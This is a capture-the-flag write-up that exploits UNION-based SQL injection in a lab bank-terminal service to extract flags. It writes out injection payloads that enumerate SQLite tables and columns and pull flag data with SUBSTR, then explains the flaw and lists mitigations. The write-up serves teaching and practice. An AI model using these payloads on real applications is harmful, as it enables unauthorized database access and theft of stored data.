
# Writeup - SQL Injection in Squireli Challenge (EchoCTF)

---

## Introduction

This challenge consists of exploiting an SQL Injection vulnerability in a service that simulates a bank terminal to obtain the hidden flag in the database. The connection is made via `nc 10.0.41.18 1337`.

---

## Step 1: Connect to the service

We connect to the remote service using netcat (nc):

```bash
nc 10.0.41.18 1337
```

It shows a menu with several bank branches (`branches`) and asks us to enter a **branch id**:

```
Pick a branch id:
```

When selecting a valid number, for example `2`, it returns information about that branch:

```
|   id |name                 |  rate |
|    2 |Mexico               | 52642 |
```

---

## Step 2: Initial observation

We try IDs `2`, `3`, `4`, etc., and see they are valid, but notice that ID `1` also exists and its name looks like a flag:

```
|   id |name                 |  rate |
|    1 |ETSCTF_1b294abeee150 | 52642 |
```

This value has the prefix `ETSCTF_`, typical in echoCTF, so we know it’s probably a partial or full flag.

---

## Step 3: Thinking about the vulnerability

Knowing this is an SQL database service, it might be vulnerable to SQL injection. The SQL query on the backend likely looks like:

```sql
SELECT * FROM branches WHERE id = 'user_input';
```

If the input is directly inserted into the query without validation or sanitization, there is a possibility of **SQL injection**.

---

## Step 4: Trying a basic SQL injection

We want to see if we can modify the query to get more information or bypass the ID filter.

A basic payload to try is:

```sql
-1 UNION SELECT 1, 2, 3 --
```

Where:

- `-1` is an invalid ID to avoid normal results.
- `UNION SELECT 1, 2, 3` tries to union a fake row with controlled values (`1`, `2`, `3`) so the app returns that row as part of the original query.
- `--` comments out the rest of the query to avoid syntax errors.

---

## Step 5: Testing the payload and analyzing the vulnerability

We input the payload to test the vulnerability:

```sql
-1 UNION SELECT 1, 2, 3 --
```

This payload tries to exploit **UNION-based SQL injection**, where:

- `-1` is an invalid value so the original query returns no real rows.
- `UNION SELECT 1, 2, 3` artificially adds a row with controlled data.
- `--` comments the rest to avoid errors.

The app responded with:

```
|   id |name                 |  rate |
|    1 |2                    |     3 |
```

This confirms:

- The app **concatenated our malicious query** to the legitimate one.
- The app **does not sanitize or validate** user input properly.
- It is possible to **manipulate results** and retrieve arbitrary data.



---

## Step 6: Enumerating tables in the database

We run the following payload to list existing tables in the SQLite database:

```sql
-1 UNION SELECT 1, name, 3 FROM sqlite_master WHERE type='table' --
```

### Explanation

- `sqlite_master` is an internal SQLite table holding the database schema.
- We filter only entries where `type='table'` to list tables.
- Use `UNION` with dummy values to match the original query’s columns and get results.

### Expected result:

```
|   id |name                 |  rate |
|    1 |branches             |     3 |
|    1 |flag                 |     3 |
```

---

## Step 7: Exploring the structure of the `flag` table

Query to get columns of the `flag` table:

```sql
-1 UNION SELECT 1, name || '|' || type, 3 FROM pragma_table_info('flag') --
```

- `pragma_table_info('flag')` returns SQLite column metadata.
- We concatenate column name and type for clarity.

Result:

```
|   id |name                 |  rate |
|    1 |name|TEXT            |     3 |
```

Indicates the `flag` table has a column `name` of type text.

---

## Step 8: Extracting the flag from the `name` column

We extract flag content:

```sql
-1 UNION SELECT 1, name, 3 FROM flag --
```

Result:

```
|   id |name                 |  rate |
|    1 |ETSCTF_4b7e39ac882ea |     3 |
```

---

## Step 9: Using `SUBSTR()` to extract the complete flag

If the flag is truncated, we use `SUBSTR()` to get fragments:

```sql
-1 UNION SELECT 1, SUBSTR(name,7,20), 3 FROM flag --
```

Extracts 20 characters starting at character 7 (after `ETSCTF_`).

```sql
-1 UNION SELECT 1, SUBSTR(name,20,30), 3 FROM flag --
```

Extracts 30 characters starting at position 20.

Concatenating fragments yields:

```
ETSCTF_4b7e39ac882eade2b9ceed5680f0717e
```

---

## Step 10: Final extraction of the flag from the `branches` table

Partial flag visible in `branches` table:

```
Pick a branch id: 1
1
|   id |name                 |  rate |
|    1 |ETSCTF_1b294abeee150 | 52642 |
```

Extract later fragments with:

```sql
-1 UNION SELECT 1, SUBSTR(name,21,40), 3 FROM branches --
```

Result:

```
|   id |name                 |  rate |
|    1 |                     |     3 |
|    1 |89657e009445fea8ebc  |     3 |
```

Concatenate:

```
ETSCTF_1b294abeee15089657e009445fea8ebc
```

---

# Conclusion

- We identified and exploited a UNION-based SQL Injection vulnerability.
- We listed tables and columns to understand database structure.
- Flags were extracted using UNION SELECT queries.
- `SUBSTR()` was used to extract full flags in fragments.
- Two complete flags were reconstructed from `flag` and `branches` tables.

---

### Type of SQL Injection and Vulnerability

This is a **UNION-based SQL Injection**.

- The backend concatenates user input directly into SQL without validation.
- Allowing UNION lets attackers inject queries to union their own data, misleading the system to reveal arbitrary information.

It is a classic vulnerability caused by:

- Lack of parameterized queries.
- No use of prepared statements.
- Absence of input sanitization.

### Mitigation Measures

Recommended to prevent this injection:

1. Use prepared statements or parameterized queries.
2. Strict input validation and sanitization.
3. Least privilege principle for database users.
4. Use ORMs or frameworks that abstract database access.
5. Monitor and alert on suspicious inputs.

```c
Writeup Made With ❤️ By SheepsStealer
```